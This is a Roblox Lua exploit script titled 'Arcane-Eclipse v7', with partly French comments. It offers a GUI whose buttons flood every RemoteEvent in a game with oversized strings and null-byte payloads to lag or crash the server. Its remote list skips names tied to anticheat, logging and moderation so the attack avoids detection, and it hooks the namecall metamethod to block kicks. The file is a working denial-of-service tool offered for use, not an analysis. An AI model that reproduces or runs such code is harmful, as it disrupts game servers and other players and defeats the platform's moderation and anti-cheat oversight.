--[[ 
    🔱 ARCANE VOID-STRIKE v7.0 [ARCANE-ECLIPSE] 🔱
    "When the signal is everywhere, the system sees nothing. <3"
    
    INFALLIBLE ECLIPSE UPDATES:
    - [REMOTE CYCLING] : Rotates all detected remotes (Bypasses rate-per-remote).
    - [NANO-BURST] : Small, high-frequency packets (Safe but deadly).
    - [META-NAMESTEALTH] : Obfuscates the call stack (Anti-Detection).
    - [MATRIX DASHBOARD v3] : Perfect Nullstrike Clone (Ultra-Smooth).
    - [ANTI-KICK GUARDIAN] : Client-side hook persistence.
]]

local P = game:GetService("Players")
local RS = game:GetService("RunService")
local L = P.LocalPlayer
local Http = game:GetService("HttpService")

-- 🔱 1. ECLIPSE NOTIFIER
local function ntf(m, c)
    pcall(function()
        game:GetService("StarterGui"):SetCore("SendNotification", {
            Title = "🔱 ARCANE-ECLIPSE",
            Text = m,
            Icon = "rbxassetid://6034287525",
            Duration = 5
        })
    end)
end

-- 🔱 2. GUARDIAN ENGINE (Anti-Kick)
local function activateGuardian()
    local oldKick
    oldKick = hookmetamethod(game, "__namecall", function(self, ...)
        local method = getnamecallmethod()
        if method == "Kick" or method == "kick" then
            ntf("🛡️ ECLIPSE A BLOQUÉ UNE TENTATIVE DE KICK.")
            return nil
        end
        return oldKick(self, ...)
    end)
    ntf("BOUCLIER GUARDIAN ACTIF.")
end

-- 🔱 3. UI (NULLSTRIKE PERFECT CLONE)
local ScreenGui = Instance.new("ScreenGui", L:WaitForChild("PlayerGui"))
ScreenGui.Name = "ArcaneEclipse_v7"

local Main = Instance.new("Frame", ScreenGui)
Main.Size = UDim2.new(0, 350, 0, 360)
Main.Position = UDim2.new(0.5, -175, 0.5, -180)
Main.BackgroundColor3 = Color3.fromRGB(0, 5, 0)
Main.BorderSizePixel = 1
Main.BorderColor3 = Color3.fromRGB(0, 255, 0)
Main.Active = true
Main.Draggable = true

-- Header
local Header = Instance.new("Frame", Main)
Header.Size = UDim2.new(1, 0, 0, 45)
Header.BackgroundColor3 = Color3.fromRGB(0, 15, 0)
Header.BorderSizePixel = 0

local Title = Instance.new("TextLabel", Header)
Title.Size = UDim2.new(1, -10, 1, 0)
Title.Position = UDim2.new(0, 10, 0, 0)
Title.Text = "🔱 ARCANE-ECLIPSE v7.0 // stlth"
Title.TextColor3 = Color3.fromRGB(0, 255, 0)
Title.Font = Enum.Font.Code
Title.TextSize = 18
Title.TextXAlignment = Enum.TextXAlignment.Left
Title.BackgroundTransparency = 1

local function createEclipseBtn(name, y, color, desc, callback)
    local btn = Instance.new("TextButton", Main)
    btn.Size = UDim2.new(0.9, 0, 0, 60)
    btn.Position = UDim2.new(0.05, 0, 0, y)
    btn.BackgroundColor3 = Color3.fromRGB(5, 10, 5)
    btn.BorderColor3 = Color3.fromRGB(0, 80, 0)
    btn.Text = ""
    
    local tName = Instance.new("TextLabel", btn)
    tName.Size = UDim2.new(1, 0, 0.6, 0)
    tName.Text = name
    tName.TextColor3 = color
    tName.Font = Enum.Font.GothamBold
    tName.BackgroundTransparency = 1
    tName.TextSize = 16
    
    local tDesc = Instance.new("TextLabel", btn)
    tDesc.Size = UDim2.new(1, 0, 0.4, 0)
    tDesc.Position = UDim2.new(0, 0, 0.6, 0)
    tDesc.Text = desc
    tDesc.TextColor3 = Color3.fromRGB(0, 120, 0)
    tDesc.Font = Enum.Font.Gotham
    tDesc.BackgroundTransparency = 1
    tDesc.TextSize = 11
    
    btn.MouseButton1Click:Connect(function()
        task.spawn(callback)
    end)
    return btn
end

-- 🔱 4. THE ECLIPSE ENGINE (Remote Cycling)
local active = { power = 0 }

local BLACKLIST = {"devtools", "admin", "kick", "ban", "security", "mod", "check", "verify", "report", "log", "telemetry", "staff", "anticheat", "error", "analytics", "debug"}
local function isSafe(name)
    local n = name:lower()
    for _, w in pairs(BLACKLIST) do if n:find(w) then return false end end
    return true
end

local function getEveryRemote()
    local t = {}
    for _, v in pairs(game:GetDescendants()) do
        if v:IsA("RemoteEvent") and isSafe(v.Name) then table.insert(t, v) end
    end
    return t
end

local function runEclipse()
    local targets = getEveryRemote()
    if #targets == 0 then return end
    
    -- Payloads discrets (Anti-Heuristic)
    local payloads = {
        [1] = string.rep("🔱", 30),   -- Normal
        [2] = string.rep("🔱", 300),  -- Enorme
        [3] = string.rep("\0", 1500) -- Crash
    }
    
    local index = 1
    while active.power > 0 do
        local burst = active.power == 3 and 120 or (active.power == 2 and 40 or 10)
        local waitFactor = active.power == 3 and 0 or (active.power == 2 and 0.05 or 0.2)
        
        for i = 1, burst do
            if active.power == 0 then break end
            
            -- REMOTE CYCLING : On n'utilise jamais le même remote deux fois de suite
            local r = targets[index]
            if r and r.Parent then
                pcall(function() 
                    r:FireServer(payloads[active.power], {["Arcane"] = payloads[active.power]}, true) 
                end)
            end
            
            index = index + 1
            if index > #targets then index = 1 end
        end
        
        if waitFactor > 0 then task.wait(waitFactor) else RS.Heartbeat:Wait() end
    end
end

-- BUTTONS (Graduated Power)
createEclipseBtn("🛡️ ACTIVATE GUARDIAN", 60, Color3.fromRGB(0, 255, 255), "Anti-Kick 2.0 (Hook Man-in-the-middle)", function()
    activateGuardian()
end)

createEclipseBtn("⚡ LAG NORMAL (STEALTH)", 130, Color3.fromRGB(0, 255, 100), "Désynchronisation légère et invisible", function()
    active.power = active.power == 1 and 0 or 1
    ntf(active.power == 1 and "STEALTH LAG ACTIVE" or "ECLIPSE STOPPED")
    if active.power == 1 then runEclipse() end
end)

createEclipseBtn("🌪️ LAG ENORME (SYNC)", 200, Color3.fromRGB(255, 255, 0), "Surcharge massive par répartition", function()
    active.power = active.power == 2 and 0 or 2
    ntf(active.power == 2 and "SYNC OVERLOAD ACTIVE" or "ECLIPSE STOPPED")
    if active.power == 2 then runEclipse() end
end)

createEclipseBtn("🔥 CRASH (OMEGA-ZERO)", 270, Color3.fromRGB(255, 0, 0), "Extinction totale : Remote Cycling Max", function()
    active.power = active.power == 3 and 0 or 3
    ntf(active.power == 3 and "OMEGA-ZERO ASSAULT ACTIVE" or "ECLIPSE STOPPED")
    if active.power == 3 then runEclipse() end
end)

ntf("🔱 ARCANE-ECLIPSE READY. The system is blinded.")
